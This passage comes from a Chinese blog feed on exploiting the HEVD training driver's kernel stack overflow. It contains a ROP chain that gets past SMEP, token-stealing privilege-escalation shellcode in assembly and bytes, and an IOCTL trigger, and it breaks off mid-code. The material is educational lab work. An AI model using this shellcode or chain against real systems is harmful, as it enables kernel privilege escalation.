class="line">0xDEAD</span><br><span class="line">ExAllocatePoolWithTag</span><br><span class="line">---------------------------</span><br><span class="line">pop rcx rdx r8 ret</span><br><span class="line">0;暂时</span><br><span class="line">shellcode_addr</span><br><span class="line">0x100;</span><br><span class="line">mov rcx, rax ret;此时rcx = ExAllocatePoolWithTag返回地内存地址</span><br><span class="line">RtlCopyMemory</span><br><span class="line">---------------------------</span><br><span class="line">jmp rax</span><br></pre></td></tr></table></figure><p>就这些gadget中的pop会消除<code>rsp+0x28</code>的驱动的<code>Handle</code>函数返回地址，所以首先是抬栈，如<code>sub rsp, 0x100</code>，在<code>jmp rax</code>之前多次调用<code>ret</code>来抬升<code>rsp</code>的值，最终回到<code>shellcode</code>调整为适用的<code>rsp</code>值。</p><p><strong>实际情况中也不会有恰好的gadget用</strong></p><p>实际上能用的<code>mov rcx, rax</code>可以通过以下方式实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x00000001408fa783 : push rax ; push rbx ; ret</span><br><span class="line">0x00000001408fa77b : push rax ; push rdi ; ret</span><br><span class="line">0x000000014020262C : pop rdi ; ret</span><br></pre></td></tr></table></figure><p>这样就能让rcx=rax了，布局后栈的情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ulExAllocatePoolWithTag</span><br><span class="line">pop_rdi</span><br><span class="line">pop_rcx</span><br><span class="line">push_rax_rdi</span><br></pre></td></tr></table></figure><ol><li><code>pop rdi</code>：<code>RDI</code> =<code>pop rcx地址</code>，出栈一个，<code>rsp</code>指向<code>push_rax_rdi</code>，然后<code>ret</code>跳转到该地址</li><li><code>push rax</code>：将申请的内核内存地址放到了栈上，<code>rsp</code>指向值就为该内存的地址</li><li><code>push rdi; ret</code>：等效于<code>jmp rdi</code>，于是<code>ret</code>到了<code>pop rcx</code></li><li><code>pop rcx</code>：此时的栈顶为 2 中入栈的<code>rax</code></li></ol><p><img src="https://img.joe1sn.top/uploads/big/28b0466a118932c4725e7f24168cef31.png" alt="image-20240120214435516" /></p><p>成功让<code>RCX=RAX</code></p><p><img src="https://img.joe1sn.top/uploads/big/68943ef85bb247fa007f3cfcc84cc1e2.png" alt="image-20240120214609588" /></p><p>这里暂时设计payload</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//typedef unsigned long long funcaddr;</span></span><br><span class="line"></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span>) = (funcaddr)pop_rcx;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">8</span>) = (funcaddr)<span class="number">0</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x10</span>) = (funcaddr)pop_rdx;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x18</span>) = (funcaddr)<span class="number">0x100</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x20</span>) = (funcaddr)pop_r8;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x28</span>) = (funcaddr)<span class="number">0xDEAD</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x30</span>) = (funcaddr)ulExAllocatePoolWithTag;</span><br><span class="line"></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x38</span>) = (funcaddr)pop_rdi;<span class="comment">//rsp = 0</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x40</span>) = (funcaddr)pop_rcx;<span class="comment">//rdi = rcx --- been force to zero</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x48</span>) = (funcaddr)push_rax_rdi;<span class="comment">//ret rdi: pop_rcx value changed</span></span><br><span class="line"></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x50</span>) = (funcaddr)pop_rdx;<span class="comment">//此处被低位被清零</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x58</span>) = (funcaddr)shellcode_addr; </span><br><span class="line"></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x70</span>) = (funcaddr)pop_r8;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x78</span>) = (funcaddr)<span class="built_in">sizeof</span>(cmd);</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x80</span>) = (funcaddr)ulRtlCopyMemory;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x88</span>) = (funcaddr)jmp_rax;</span><br></pre></td></tr></table></figure><p>但是进行<code>ExAllocatePoolWithTag</code></p><p><img src="https://img.joe1sn.top/uploads/big/bd6c315f3f534e5d95e65b69621299b0.png" alt="image-20240121084806324" /></p><p>打断了ROP链，让<code>rsp+68</code>的位置的低32位清零了，这让我们需要调整这段rop链</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x50</span>) = (funcaddr)pop_rdx;<span class="comment">//此处被低位被清零</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x58</span>) = (funcaddr)shellcode_addr; </span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x60</span>) = (funcaddr)pop_rdx;<span class="comment">//恢复rdx</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x68</span>) = (funcaddr)shellcode_addr;</span><br><span class="line">   </span><br><span class="line">   *(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x70</span>) = (funcaddr)pop_r8;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x78</span>) = (funcaddr)<span class="built_in">sizeof</span>(cmd);</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/bedc06d732b94afafa28a2688c0a94d6.png" alt="image-20240121093505807" /></p><p>在设置<code>CR4.SMEP</code>的情况下，依靠内核分配的内存，成功运行了shellcode，ROP链进行了多次调用，让最后shellcode中的<code>rsp</code>值不好估计，并且栈的情况可能随着函数的调用将原有的值抹去，<strong>这里先把shellcode换成从TrapFrame返回的</strong></p><p><img src="https://img.joe1sn.top/uploads/big/39d57b872ac0473e469f8056ebedb9d3.png" alt="image-20240121095833438" /></p><h2 id="c-优化shellcode"><a class="markdownIt-Anchor" href="#c-优化shellcode"></a> C. 优化shellcode</h2><p>所以这段shellcode参考shellcode编写的C、D部分，加上了所有功能Enabled的shellcode片段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">[Bits 64]</span><br><span class="line"></span><br><span class="line">_start:    </span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov rax, gs:[rax + 0x188]</span><br><span class="line">    mov rax, [rax + 0xb8]     ;rax = 当前EPROCESS</span><br><span class="line">    mov r9, rax               ;r9  = 当前EPROCESS</span><br><span class="line">    mov rax, [rax + 0x448]    ;rax = 当前EPROCESS.List</span><br><span class="line">    mov rax, [rax]            ;rax = 当前EPROCESS.List-&gt;flink</span><br><span class="line"></span><br><span class="line">__loop:</span><br><span class="line">    mov rdx, [rax - 0x8]      ;rdx = 上一个进程的 upid</span><br><span class="line">    mov r8, rax               ;r8  = 当前EPROCESS.List-&gt;flink</span><br><span class="line">    mov rax, [rax]            ;rax = 上一个进程的.List</span><br><span class="line">    cmp rdx, 0x4</span><br><span class="line">    jnz __loop</span><br><span class="line"></span><br><span class="line">    ;rdx = 4</span><br><span class="line">    ;r8 = System EPROCESS</span><br><span class="line"></span><br><span class="line">    mov rdx, [r8+0x70]      ;rdx = system token</span><br><span class="line">    and rdx, -0x8           ;消除低4位</span><br><span class="line">    mov rcx, [r9+0x4b8]     ;当前EPROCESS的token</span><br><span class="line">    and rcx, 0x7            ;</span><br><span class="line">    add rdx, rcx            ;rdx = 系统token高位+当前token低4位</span><br><span class="line">    mov [r9+0x4b8], rdx     ;将合成的token复制给当前</span><br><span class="line"></span><br><span class="line">    ;Enable ALL</span><br><span class="line">    mov rdx, [r8 + 0x70]      ;rdx = system token</span><br><span class="line">    and rdx, 0xFFFFFFFFFFFFFFF0           ;system token: 消除低8位，便于解析Token</span><br><span class="line">    mov rbx, [rdx + 0x40]     ;rbx = System token的Present</span><br><span class="line">    mov rcx, [r9 + 0x4b8]     ;rcx = 新的EPROCESS的token</span><br><span class="line">    and rcx, 0xFFFFFFFFFFFFFFF0           ;new current token: 消除低8位，便于解析Token</span><br><span class="line">    mov [rcx + 0x40], rbx</span><br><span class="line">    mov [rcx + 0x48], rbx</span><br><span class="line"></span><br><span class="line">    mov     rax, gs:188h</span><br><span class="line">    mov     cx, [rax+1E4h]</span><br><span class="line">    inc     cx</span><br><span class="line">    mov     [rax+1E4h], cx</span><br><span class="line">    mov     rdx, [rax+90h]</span><br><span class="line">    mov     rcx, [rdx+168h]</span><br><span class="line">    mov     r11, [rdx+178h]</span><br><span class="line">    mov     rsp, [rdx+180h]</span><br><span class="line">    mov     rbp, [rdx+158h]</span><br><span class="line">    xor     eax, eax</span><br><span class="line">    swapgs</span><br><span class="line">    o64 sysret</span><br></pre></td></tr></table></figure><p>得到shellcode</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> cmd[<span class="number">176</span>] = &#123;</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xC1</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>,</span><br><span class="line"><span class="number">0x89</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xFA</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xF0</span>, <span class="number">0x49</span>,</span><br><span class="line"><span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xCA</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0x91</span>,</span><br><span class="line"><span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF0</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x5A</span>, <span class="number">0x40</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0xF0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x59</span>, <span class="number">0x40</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x59</span>, <span class="number">0x48</span>, <span class="number">0x65</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x04</span>, <span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x8B</span>, <span class="number">0x88</span>, <span class="number">0xE4</span>,</span><br><span class="line"><span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0xFF</span>, <span class="number">0xC1</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x68</span>,</span><br><span class="line"><span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4C</span>, <span class="number">0x8B</span>, <span class="number">0x9A</span>, <span class="number">0x78</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>,</span><br><span class="line"><span class="number">0xA2</span>, <span class="number">0x80</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xAA</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x0F</span>, <span class="number">0x01</span>, <span class="number">0xF8</span>, <span class="number">0x48</span>, <span class="number">0x0F</span>, <span class="number">0x07</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/92433bde7fdb3c57a079ce6037669523.png" alt="image-20240121200156534" /></p><p>缺点就是程序无法exit退出，不过可以在shellcode中设置Token迁移等一些其他操作，这里就不展开了</p><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><p><a href="https://wumb0.in/finding-the-base-of-the-windows-kernel.html">https://wumb0.in/finding-the-base-of-the-windows-kernel.html</a></p><p><a href="https://github.com/xct/windows-kernel-exploits">https://github.com/xct/windows-kernel-exploits</a></p><p><a href="https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/">https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/</a></p><p><a href="https://hshrzd.wordpress.com/2017/06/22/starting-with-windows-kernel-exploitation-part-3-stealing-the-access-token/">https://hshrzd.wordpress.com/2017/06/22/starting-with-windows-kernel-exploitation-part-3-stealing-the-access-token/</a></p><p><a href="https://mdanilor.github.io/posts/hevd-2/">https://mdanilor.github.io/posts/hevd-2/</a></p>]]></content>
    
    
    <summary type="html">&lt;hr /&gt;
&lt;p&gt;上：&lt;a href=&quot;https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/&quot;&gt;https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;中：&lt;a href=&quot;https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/&quot;&gt;https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;文章已在先知社区投稿：&lt;a href=&quot;https://xz.aliyun.com/t/13365&quot;&gt;https://xz.aliyun.com/t/13365&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本附录对第二章的以下几个遗留问题做出说明&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;user编程寻找ROPGadget&lt;/li&gt;
&lt;li&gt;shellcode编写&lt;/li&gt;
&lt;li&gt;Token提权&lt;/li&gt;
&lt;li&gt;KVAS&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【Win Pwn】HEVD-内核栈溢出(中)</title>
    <link href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/"/>
    <id>https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/</id>
    <published>2024-01-25T07:07:30.000Z</published>
    <updated>2024-02-24T03:51:44.152Z</updated>
    
    <content type="html"><![CDATA[<p>在<a href="">上一篇</a>中了解了与内核的交互模式，这里就可以开始做HEVD了</p><p>文章已在先知社区投稿：<a href="https://xz.aliyun.com/t/13364">https://xz.aliyun.com/t/13364</a></p><span id="more"></span><h1 id="编写交互模块"><a class="markdownIt-Anchor" href="#编写交互模块"></a> 编写交互模块</h1><h2 id="a-计算io_ctl值"><a class="markdownIt-Anchor" href="#a-计算io_ctl值"></a> A. 计算IO_CTL值</h2><p><strong>其实不用这步，但是可以当作更多的了解</strong></p><p>在之前的交互中有这么一条定义功能号</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_MUL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x9888, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br></pre></td></tr></table></figure><p>但是…HEVD逆向会发现是这样的</p><p><img src="https://img.joe1sn.top/uploads/big/b5952825f83268246d9e59addb480507.png" alt="image-20240117184722533" /></p><p>发现<code>CTL_CODE</code>也是个宏定义</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CTL_CODE( DeviceType, Function, Method, Access ) (                 \</span></span><br><span class="line"><span class="meta">    ((DeviceType) &lt;&lt; 16) | ((Access) &lt;&lt; 14) | ((Function) &lt;&lt; 2) | (Method) \</span></span><br><span class="line"><span class="meta">)</span></span><br></pre></td></tr></table></figure><p>其中，这里</p><ul><li>DeviceType -&gt; FILE_DEVICE_UNKNOWN = 0x22</li><li>Function -&gt; = 0x9888</li><li>Method -&gt; METHOD_BUFFERED=0</li><li>Access -&gt; FILE_ANY_ACCESS=0</li></ul><p>表达式就为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  (0x22 &lt;&lt; 16) | (0 &lt;&lt; 14) | ( 0x9888 &lt;&lt; 2) | 0</span><br><span class="line">= 0x220000 | 0 | 0x9888 &lt;&lt; 2 | 0</span><br><span class="line">= 0x220000 | 0x9888 &lt;&lt; 2</span><br><span class="line">= 0x226220</span><br></pre></td></tr></table></figure><p>很容易得到逆向，这里以<code>0x226220</code>为例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x205B = 0x22205B ^ 0x220000</span><br><span class="line">0x816 = 0x205B&gt;&gt;2</span><br></pre></td></tr></table></figure><p>那么对应的函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">io2num</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> ioctl_num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((ioctl_num ^ <span class="number">0x220000</span>) &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0xfff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面之所以要&amp;一下是因为数据的大小就只有那么大，所以<strong>II文章</strong>的描述符<code>0x9888</code>实际有效的只有<code>0x888</code></p><h2 id="b-功能选择"><a class="markdownIt-Anchor" href="#b-功能选择"></a> B. 功能选择</h2><p>这里就以最简单的内核栈溢出举例子</p><p>每开始一个漏洞利用就编写一个菜单，然后选择解析逆向出来的功能描述符，运行对应函数，没啥好讲的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">menu</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;============HEVD Hack EXP============\n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot; 1. [0x222003]****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;input io ctl&gt; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line">    hDevice = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;\\\\.\\My1DeviceLinker&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Error Create File\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> io_ctl = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">menu</span>();</span><br><span class="line">    <span class="built_in">scanf_s</span>(<span class="string">&quot;%x&quot;</span>, &amp;io_ctl);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x, %x&quot;</span>, io_ctl, <span class="built_in">io2num</span>(io_ctl));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (io_ctl)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Now Excuting ...\n&quot;</span>;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;1. [0x222003]****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ****** ...\n&quot;</span>;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// EXP FUNCTION HERE</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="c-简单与功能交互"><a class="markdownIt-Anchor" href="#c-简单与功能交互"></a> C. 简单与功能交互</h2><p><img src="https://img.joe1sn.top/uploads/big/7a3682b00304fa6f8b1ed11bcbb9d718.png" alt="image-20240117192837142" /></p><p>这里要传一个空间和大小过去，这里用的到方式就是上一篇的IOCTL方式</p><p>这里我把所有的exp定义在<code>exp.c</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflow</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> stackspace[<span class="number">0x50</span>] = <span class="string">&quot;aaaaa\0&quot;</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x30</span>;</span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl, stackspace, <span class="built_in">sizeof</span>(DWORDLONG), &amp;size, <span class="built_in">sizeof</span>(DWORDLONG), &amp;info, <span class="literal">NULL</span>);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;IO Complete\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/a6c2dc60148f0770a7225e57d80fe2c7.png" alt="image-20240117195630472" /></p><p>驱动定义了一个2048大小的栈空间<code>v5</code>，但是写入的空间是我们可以控制的，尝试触发漏洞</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflow</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x1000</span>;</span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, size, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl, </span><br><span class="line">stackspace, size, </span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>, </span><br><span class="line">&amp;info, <span 